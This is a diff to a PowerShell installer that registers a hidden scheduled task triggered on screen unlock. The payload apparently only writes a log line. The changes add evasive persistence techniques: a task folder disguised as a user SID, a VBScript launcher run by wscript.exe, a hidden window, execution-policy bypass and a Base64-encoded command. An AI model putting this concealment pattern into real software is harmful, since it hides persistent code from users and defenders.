@@ -1,6 +1,7 @@
 param(
     [switch]$NoStage,
     [switch]$Uninstall,
+    [switch]$Schedule,
     [string]$SourcePath,
     [string]$ConfigFile,
     $Verbose = $false,
@@ -32,6 +33,11 @@ function Get-Config {
     }
 }
 
+function Get-AppName {
+    $userSid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
+    return $userSid -replace '\d{4}$', '-666'
+}
+
 function Install-Script {
     $sourceScript = if ($SourcePath) { $SourcePath } else { $PSCommandPath }
     if (-not $sourceScript) {
@@ -59,14 +65,21 @@ function Install-Script {
     }
 }
 
+function Run-Schedule {
+    Add-Content -Path 'C:\Users\twl600\src\goat\out.log' -Value "Run-Schedule $(Get-Date -Format o)"
+    
+}
+
 function Install-Job {
-    # Installs a scheduled task called $config.jobName into the folder $config.appName.
+    # Installs a scheduled task called $config.jobName into the generated app folder.
     # The task will run delayed $delay minutes after unlocking of the screen.
-    # Task will execute powershell.exe -NoProfile -WindowStyle Hidden -EncodedCommand <test command>
-    $taskPath = "\$($config.appName)\"
+    # Task will execute the installed script with -Schedule.
+    $taskPath = "\$appName\"
     $taskName = $config.jobName
     $userId = "$env:USERDOMAIN\$env:USERNAME"
     $delay = [int]$config.startupDelay
+    $targetScript = Join-Path -Path $targetDir -ChildPath $scriptName
+    $scheduleHost = Join-Path -Path $targetDir -ChildPath $config.launcherName
 
     Write-Verbose "Installing scheduled task $taskPath$taskName."
     Write-Verbose "Scheduled task delay is $delay minutes."
@@ -78,10 +91,10 @@ function Install-Job {
 
     try {
         Write-Verbose "Opening scheduled task folder $taskPath."
-        $folder = $rootFolder.GetFolder($config.appName)
+        $folder = $rootFolder.GetFolder($appName)
     } catch {
         Write-Verbose "Creating scheduled task folder $taskPath."
-        $folder = $rootFolder.CreateFolder($config.appName)
+        $folder = $rootFolder.CreateFolder($appName)
     }
 
     try {
@@ -107,11 +120,15 @@ function Install-Job {
     $unlockTrigger.Delay = "PT$delay`M"
 
     Write-Verbose "Creating scheduled task action."
-    $taskCommand = 'Write-Output "hello world"; pause'
+    $taskCommand = "& ([scriptblock]::Create((Get-Content -Raw -LiteralPath '$targetScript'))) -Schedule"
     $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($taskCommand))
+    $hostCommand = "CreateObject(""WScript.Shell"").Run ""powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $encodedCommand"", 0, False"
+    Set-Content -Path $scheduleHost -Value $hostCommand -Encoding ASCII
+    Write-Verbose "Created hidden schedule host at $scheduleHost."
+
     $action = $definition.Actions.Create(0)
-    $action.Path = 'powershell.exe'
-    $action.Arguments = "-NoProfile -WindowStyle Hidden -EncodedCommand $encodedCommand"
+    $action.Path = 'wscript.exe'
+    $action.Arguments = "//E:VBScript `"$scheduleHost`""
 
     Write-Verbose "Registering scheduled task $taskPath$taskName."
     try {
@@ -162,7 +179,7 @@ function Uninstall-Script {
     $service = New-Object -ComObject Schedule.Service
     $service.Connect()
     $rootFolder = $service.GetFolder('\')
-    $taskFolderName = $config.appName
+    $taskFolderName = $appName
 
     try {
         $taskFolder = $rootFolder.GetFolder($taskFolderName)
@@ -192,9 +209,16 @@ function Uninstall-Script {
 # Main
 #
 
+if ($Schedule) {
+    Run-Schedule
+    return
+}
+
 # Load configuration settings
 $config = Get-Config
 Write-Verbose "Loaded config settings:`n$($config | Out-String)"
+$appName = Get-AppName
+Write-Verbose "Generated app name: $appName"
 
 
 # Determine the script name and path from the configuration.
@@ -206,7 +230,7 @@ Write-Verbose "Staged script path: $stagedScript"
 $targetDir = if ($config.targetDir) {
     $config.targetDir
 } else {
-    Join-Path -Path $env:APPDATA -ChildPath "$($config.interrimPath)\$($config.appName)"
+    Join-Path -Path $env:APPDATA -ChildPath "$($config.interrimPath)\$appName"
 }
 Write-Verbose "Target directory for script: $targetDir"
 
